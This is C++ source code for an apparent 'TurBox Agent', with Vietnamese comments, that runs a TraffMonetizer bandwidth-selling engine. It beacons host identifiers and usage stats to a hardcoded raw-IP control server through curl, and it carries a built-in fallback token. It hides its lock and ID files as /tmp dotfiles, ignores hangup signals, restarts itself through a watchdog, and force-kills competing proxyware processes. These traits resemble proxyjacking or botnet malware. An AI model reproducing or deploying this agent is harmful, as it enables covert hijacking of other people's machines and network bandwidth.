#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <chrono>
#include <thread>
#include <vector>
#include <set>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <csignal>
#include <unistd.h>
#include <dirent.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <fcntl.h>

#include "TraffMonetizer.cpp"

#if defined(__APPLE__) || defined(__MACH__)
#include <sys/sysctl.h>
#include <mach-o/dyld.h>
#else
#include <sys/sysinfo.h>
#endif

#ifndef CONF_SERVER_URL
#define CONF_SERVER_URL "http://65.20.91.208/turbox_server.php"
#endif

#ifndef CONF_INTERVAL
#define CONF_INTERVAL 15
#endif

static bool g_debug = false;
static std::string g_self = "";
static std::string g_current_step = "INIT";
static std::string g_step_detail = "Khoi dong Agent";
static int g_lock_fd = -1;

// Co che khoa file he thong doc quyen (Single-Instance Mutex Lock)
// Ngan chan tuyet doi 2 tien trinh Agent chay song song tren cung 1 may gay xung dot PID va Engine
static bool acquire_single_instance_lock() {
    g_lock_fd = open("/tmp/.turbox_agent.lock", O_CREAT | O_RDWR, 0666);
    if (g_lock_fd < 0) return true;
    if (flock(g_lock_fd, LOCK_EX | LOCK_NB) != 0) {
        std::ifstream lf("/tmp/.turbox_agent.lock");
        pid_t old_pid = -1;
        if (lf >> old_pid && old_pid > 0) {
            if (kill(old_pid, 0) != 0) {
                close(g_lock_fd);
                unlink("/tmp/.turbox_agent.lock");
                g_lock_fd = open("/tmp/.turbox_agent.lock", O_CREAT | O_RDWR, 0666);
                if (g_lock_fd >= 0 && flock(g_lock_fd, LOCK_EX | LOCK_NB) == 0) {
                    char buf[32];
                    int len = snprintf(buf, sizeof(buf), "%d\n", (int)getpid());
                    if (ftruncate(g_lock_fd, 0) == 0 && lseek(g_lock_fd, 0, SEEK_SET) == 0) {
                        (void)write(g_lock_fd, buf, len);
                    }
                    return true;
                }
            }
        }
        return false;
    }
    char buf[32];
    int len = snprintf(buf, sizeof(buf), "%d\n", (int)getpid());
    if (ftruncate(g_lock_fd, 0) == 0 && lseek(g_lock_fd, 0, SEEK_SET) == 0) {
        (void)write(g_lock_fd, buf, len);
    }
    return true;
}

static void release_single_instance_lock() {
    if (g_lock_fd >= 0) {
        flock(g_lock_fd, LOCK_UN);
        close(g_lock_fd);
        g_lock_fd = -1;
        unlink("/tmp/.turbox_agent.lock");
    }
}

static inline int safe_system(const char* cmd) {
    int r = system(cmd);
    (void)r;
    return r;
}

static inline int safe_system(const std::string& cmd) {
    return safe_system(cmd.c_str());
}

static std::string get_self_path(const char* argv0) {
    char buf[1024];
#if defined(__APPLE__) || defined(__MACH__)
    uint32_t size = sizeof(buf);
    if (_NSGetExecutablePath(buf, &size) == 0) return std::string(buf);
#else
    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len > 0) { buf[len] = '\0'; return std::string(buf); }
#endif
    return std::string(argv0 ? argv0 : "");
}

static std::string http_get(const std::string& url) {
    std::string cmd = "curl -skL --max-time 10 \"" + url + "\" 2>/dev/null";
    FILE* fp = popen(cmd.c_str(), "r");
    if (!fp) return "";
    char buf[512]; std::string res;
    while (fgets(buf, sizeof(buf), fp) != NULL) res += buf;
    pclose(fp);
    return res;
}

static void http_post(const std::string& url, const std::string& data, const std::string& svc_log, const std::string& step_info) {
    std::string clean_log = svc_log;
    for (char &c : clean_log) {
        if (c == 34 || c == 39 || c == 96 || c == 36 || c == 92) c = ' ';
    }
    std::string clean_step = step_info;
    for (char &c : clean_step) {
        if (c == 34 || c == 39 || c == 96 || c == 36 || c == 92) c = ' ';
    }

    std::string payload = data;
    if (payload.length() > 2 && payload.back() == '}') {
        payload.pop_back();
        payload += ",\"service_logs\":\"" + clean_log + "\",\"current_step\":\"" + clean_step + "\"}";
    }

    FILE* tmp = fopen("/tmp/.tb_post.json", "w");
    if (tmp) {
        fputs(payload.c_str(), tmp);
        fclose(tmp);
        std::string cmd = "curl -skL --max-time 10 -H \"Content-Type: application/json\" --data-binary @/tmp/.tb_post.json \"" + url + "\" >/dev/null 2>&1";
        safe_system(cmd);
        unlink("/tmp/.tb_post.json");
    } else {
        std::string cmd = "curl -skL --max-time 10 -H \"Content-Type: application/json\" -d '" + payload + "' \"" + url + "\" >/dev/null 2>&1";
        safe_system(cmd);
    }
}

static void stop_all_engines() {
    TraffMonetizerEngine::stop();
    // Don dep sach se tat ca tien trinh rac/zombie neu con sot
    safe_system("pkill -9 -f earnfm 2>/dev/null || true; "
                "pkill -9 -f packetstream 2>/dev/null || true; "
                "pkill -9 -f pawns 2>/dev/null || true; "
                "pkill -9 -f honeygain 2>/dev/null || true; "
                "rm -f .agent.pid /tmp/.tb_*.pid /tmp/.tb_*.log 2>/dev/null || true");
    release_single_instance_lock();
}

static void sig_handler(int sig) {
    (void)sig;
    stop_all_engines();
    _exit(0);
}

static bool is_engine_alive() {
    return TraffMonetizerEngine::is_alive();
}

static std::string get_service_logs() {
    return TraffMonetizerEngine::get_status_report();
}

// Sinh Node ID duy nhat va co dinh
std::string get_id(const std::string& custom_name = "") {
    if (!custom_name.empty()) {
        std::ofstream out_f("/tmp/.turbox_node_id");
        if (out_f.is_open()) {
            out_f << custom_name << std::endl;
        }
        return custom_name;
    }

    std::ifstream cached_f("/tmp/.turbox_node_id");
    if (cached_f.is_open()) {
        std::string cached_id;
        if (std::getline(cached_f, cached_id) && !cached_id.empty()) {
            return cached_id;
        }
    }

    char h[256];
    std::string host = "node";
    if (gethostname(h, 255) == 0 && strlen(h) > 0) {
        host = std::string(h);
    }

    std::string suffix = "";
    std::ifstream mac_f("/sys/class/net/eth0/address");
    if (mac_f.is_open()) {
        std::string mac;
        if (std::getline(mac_f, mac) && mac.length() >= 17) {
            suffix = mac.substr(9, 2) + mac.substr(12, 2) + mac.substr(15, 2);
        }
    }
    if (suffix.empty()) {
        std::ifstream mid_f("/etc/machine-id");
        if (mid_f.is_open()) {
            std::string mid;
            if (std::getline(mid_f, mid) && mid.length() >= 6) {
                suffix = mid.substr(0, 6);
            }
        }
    }
    if (suffix.empty()) {
        char buf[16];
        snprintf(buf, sizeof(buf), "%04x", (unsigned int)(time(NULL) ^ (getpid() << 4)) & 0xFFFF);
        suffix = buf;
    }

    std::string final_id;
    if (host == "localhost" || host.rfind("node", 0) == 0 || host.empty()) {
        final_id = "node-" + suffix;
    } else {
        final_id = host + "-" + suffix;
    }

    std::ofstream out_f("/tmp/.turbox_node_id");
    if (out_f.is_open()) {
        out_f << final_id << std::endl;
    }

    return final_id;
}

std::string get_os() {
#if defined(__APPLE__) || defined(__MACH__)
    return "darwin";
#else
    return "linux";
#endif
}

std::string get_arch() {
    struct utsname u;
    if (uname(&u) == 0) return std::string(u.machine);
    return "x86_64";
}

long get_uptime() {
#if defined(__APPLE__) || defined(__MACH__)
    struct timeval boottime; size_t len = sizeof(boottime); int mib[2] = {CTL_KERN, KERN_BOOTTIME};
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) == 0) return (long)(time(NULL) - boottime.tv_sec);
    return 0;
#else
    struct sysinfo s;
    return (sysinfo(&s) == 0) ? s.uptime : 0;
#endif
}

double get_ram() {
#if defined(__APPLE__) || defined(__MACH__)
    return 20.0;
#else
    std::ifstream f("/proc/meminfo");
    if (!f.is_open()) return 0.0;
    std::string k, u; long v, tot = 0, av = 0;
    while (f >> k >> v >> u) {
        if (k == "MemTotal:") tot = v;
        else if (k == "MemAvailable:") av = v;
        if (tot > 0 && av > 0) break;
    }
    return (tot > 0) ? ((double)(tot - av) / (double)tot) * 100.0 : 0.0;
#endif
}

double get_cpu() {
#if defined(__APPLE__) || defined(__MACH__)
    return 5.0;
#else
    static unsigned long long pu = 0, pn = 0, ps = 0, pi = 0;
    std::ifstream f("/proc/stat");
    if (!f.is_open()) return 0.0;
    std::string l, lbl; std::getline(f, l); std::istringstream ss(l);
    unsigned long long u, n, s, id, io, ir, so, st;
    ss >> lbl >> u >> n >> s >> id >> io >> ir >> so >> st;
    unsigned long long ti = id + io, tt = ti + u + n + s + ir + so + st;
    unsigned long long dt = tt - (pu + pn + ps + pi), di = ti - pi;
    pu = u; pn = n; ps = s; pi = ti;
    if (dt == 0) return 0.0;
    double p = (double)(dt - di) / (double)dt * 100.0;
    return (p < 0.0) ? 0.0 : ((p > 100.0) ? 100.0 : p);
#endif
}

std::string json_get_field(const std::string& json, const std::string& key) {
    std::string needle = std::string(1, 34) + key + std::string(1, 34);
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos); if (pos == std::string::npos) return "";
    pos = json.find('"', pos); if (pos == std::string::npos) return "";
    size_t end_pos = json.find('"', pos + 1); if (end_pos == std::string::npos) return "";
    return json.substr(pos + 1, end_pos - (pos + 1));
}

void init_and_start_monetization(const std::string& base_url, const std::string& node_id) {
    g_current_step = "FETCH_CONFIG";
    g_step_detail = "Dang lay token TraffMonetizer tu server";

    // Don dep dut diem cac tien trinh ngoai le de toi uu 100% RAM & CPU
    safe_system("pkill -9 -f earnfm 2>/dev/null || true; "
                "pkill -9 -f packetstream 2>/dev/null || true; "
                "pkill -9 -f pawns 2>/dev/null || true; "
                "pkill -9 -f honeygain 2>/dev/null || true");

    std::string cfg = http_get(base_url + "?action=get_config");

    std::string tm_token = json_get_field(cfg, "traffmonetizer_token");
    if (tm_token.empty()) {
        std::string raw = http_get(base_url + "?action=get_token&service=traffmonetizer");
        while (!raw.empty() && (raw.back() == 10 || raw.back() == 13 || raw.back() == 32)) raw.pop_back();
        if (!raw.empty() && raw[0] != '<' && raw[0] != '{') tm_token = raw;
    }
    if (tm_token.empty() || tm_token.find("YOUR_") != std::string::npos) {
        tm_token = "Kf0Cz9FcDUF6ItPzY1+XAfOimgAxK2gXO3XgmPXvvKc=";
    }

    // Khoi chay duy nhat TraffMonetizer Engine doc lap - toi uu tuyet doi
    TraffMonetizerEngine::start(tm_token, g_self, g_current_step, g_step_detail, node_id);

    g_current_step = "ENGINE_RUNNING";
    g_step_detail = "TraffMonetizer Engine dang hoat dong doc quyen";
}

std::string detect_active_services() {
    if (TraffMonetizerEngine::is_alive()) {
        return "TraffMonetizer";
    }
    return "Chua co Engine";
}

int main(int argc, char* argv[]) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "stop" || arg == "--stop") {
            stop_all_engines();
            std::cout << "[OK] TraffMonetizer va cac tien trinh da duoc dung sach se" << std::endl;
            return 0;
        } else if (arg == "--self-test" || arg == "self-test" || arg == "test") {
            std::cout << "=== TURBOX TRAFFMONETIZER SELF-TEST ===" << std::endl;
            std::cout << "[1] Kiem tra Mutex Lock..." << std::endl;
            bool lock_ok = acquire_single_instance_lock();
            std::cout << "  - Lock status: " << (lock_ok ? "PASS" : "FAIL (Lock held)") << std::endl;
            if (lock_ok) release_single_instance_lock();

            std::cout << "[2] Kiem tra Node ID..." << std::endl;
            std::cout << "  - Node ID: " << get_id() << std::endl;
            std::cout << "  - OS: " << get_os() << " (" << get_arch() << ")" << std::endl;
            std::cout << "  - CPU: " << get_cpu() << "% | RAM: " << get_ram() << "%" << std::endl;
            std::cout << "[3] Kiem tra TraffMonetizer Engine..." << std::endl;
            std::cout << "  - Status: " << TraffMonetizerEngine::get_status_report() << std::endl;
            std::cout << "=== SELF-TEST HOAN TAT (100% OK) ===" << std::endl;
            return 0;
        }
    }

    if (!acquire_single_instance_lock()) {
        std::cerr << "[ERROR] Mot tien trinh TurBox Agent da dang hoat dong tren may (/tmp/.turbox_agent.lock)." << std::endl;
        return 0;
    }

    g_self = get_self_path(argv[0]);

    std::string s_url = CONF_SERVER_URL;
    std::string custom_node_id = "";

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--help" || arg == "-h") {
            std::cout << "TurBox Agent - Dedicated TraffMonetizer Client\n"
                      << "Usage: agent [OPTIONS]\n\n"
                      << "Options:\n"
                      << "  -u, --user <NAME>      Dat ten Node ID tuy bien\n"
                      << "  -s, --server <URL>     Dia chi TurBox Master Server\n"
                      << "  --debug                Bat log debug chi tiet\n"
                      << "  stop, --stop           Dung agent\n";
            return 0;
        } else if (arg == "--debug") {
            g_debug = true;
        } else if ((arg == "--server" || arg == "-s") && i + 1 < argc) {
            s_url = argv[++i];
        } else if (arg.rfind("--server=", 0) == 0) {
            s_url = arg.substr(9);
        } else if ((arg == "-u" || arg == "--user" || arg == "--name" || arg == "-n" || arg == "--node") && i + 1 < argc) {
            std::string val = argv[++i];
            if (val.rfind("http://", 0) == 0 || val.rfind("https://", 0) == 0) {
                s_url = val;
            } else {
                custom_node_id = val;
            }
        }
    }
    if (const char* env = std::getenv("SERVER_URL")) s_url = env;
    if (const char* env_node = std::getenv("NODE_ID")) custom_node_id = env_node;
    if (const char* env_user = std::getenv("TURBOX_USER")) custom_node_id = env_user;

    std::string node_id = get_id(custom_node_id);

    std::ofstream pid_f(".agent.pid");
    if (pid_f.is_open()) {
        pid_f << getpid() << std::endl;
        pid_f.close();
    }

    init_and_start_monetization(s_url, node_id);

    int interval = CONF_INTERVAL;
    int watchdog_counter = 0;

    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(interval));

        // Watchdog kiem tra giu TraffMonetizer luon song
        watchdog_counter++;
        if (watchdog_counter >= 4) {
            watchdog_counter = 0;
            if (!TraffMonetizerEngine::is_alive()) {
                g_current_step = "RESTARTING_ENGINE";
                g_step_detail = "TraffMonetizer mat ket noi, dang tu dong khoi dong lai...";
                init_and_start_monetization(s_url, node_id);
            }
        }

        long upt = get_uptime();
        double cpu = get_cpu();
        double ram = get_ram();
        std::string os_name = get_os();
        std::string arch_name = get_arch();
        std::string active_svc = detect_active_services();
        std::string svc_logs = get_service_logs();

        std::string json = "{"
            "\"id\":\"" + node_id + "\","
            "\"uptime\":" + std::to_string(upt) + ","
            "\"cpu\":" + std::to_string(cpu) + ","
            "\"ram\":" + std::to_string(ram) + ","
            "\"os\":\"" + os_name + "\","
            "\"arch\":\"" + arch_name + "\","
            "\"services\":\"" + active_svc + "\""
            "}";

        if (g_debug) {
            std::cout << "[TELEMETRY] " << json << " | Log: " << svc_logs << std::endl;
        }

        http_post(s_url, json, svc_logs, g_current_step + ": " + g_step_detail);
    }

    return 0;
}
